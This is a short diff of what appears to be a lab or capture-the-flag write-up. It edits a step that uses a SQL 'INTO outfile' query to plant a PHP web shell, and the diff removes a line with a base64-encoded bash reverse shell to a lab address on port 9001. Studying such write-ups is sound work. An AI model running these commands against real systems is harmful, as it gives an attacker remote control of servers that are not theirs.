@@ -599,7 +599,6 @@ Let's use our script to write our payload into a `revshell.php` file:
 
 ```sql
 > SELECT "<?php system('/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i') ?>" INTO outfile "/var/www/html/revshell.php"
-SELECT "<?php system('/bin/echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvOTAwMSAwPiYx | /usr/bin/base64 -d | /bin/bash -i') ?>" INTO outfile "/var/www/html/revshell.php"
 ```
 
 Now let's trigger our payload.
